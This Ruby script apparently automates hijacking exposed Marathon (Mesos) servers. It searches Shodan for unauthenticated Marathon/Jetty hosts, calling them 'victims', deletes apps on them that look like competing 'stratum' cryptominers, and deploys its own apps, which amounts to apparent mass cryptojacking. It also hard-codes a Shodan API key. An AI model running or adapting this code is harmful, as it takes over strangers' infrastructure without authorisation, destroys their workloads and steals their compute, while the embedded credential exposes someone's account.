require 'shodan'
require 'ipaddr'
require 'awesome_print'
require 'marathon'

MY_API_KEY = "JsyCs77Kh69kc6MyrHkZ0mgwXWe4XSXZ"

class Scrapper
  def self.find_victims
    api = Shodan::Shodan.new(MY_API_KEY)
    result = api.count('marathon product:"Jetty"')
    total = result["total"]

    1.upto(total/100 + 1 ).each do |page|
      result = api.search('marathon product:"Jetty"', page: page)
      result["matches"].each do |victim|
        ip = IPAddr.new(victim['ip'], Socket::AF_INET).to_s
        port = victim['port']

        url = "http://#{ip}:#{port}"
        node = Node.marathon.find_or_initialize_by(ip: ip)
        node.port = port
        node.save

        Marathon.url = url
        begin
          Marathon::App.list.each do |app|
            if app.info.to_json =~ /stratum/
              puts "app #{app.info[:id]} on #{url} possible miner"
              Marathon::App.delete app.info[:id]
            end
          end
        rescue Exception => e
          puts e
        end

        node.deploy_my_apps
      end
    end
  end

end


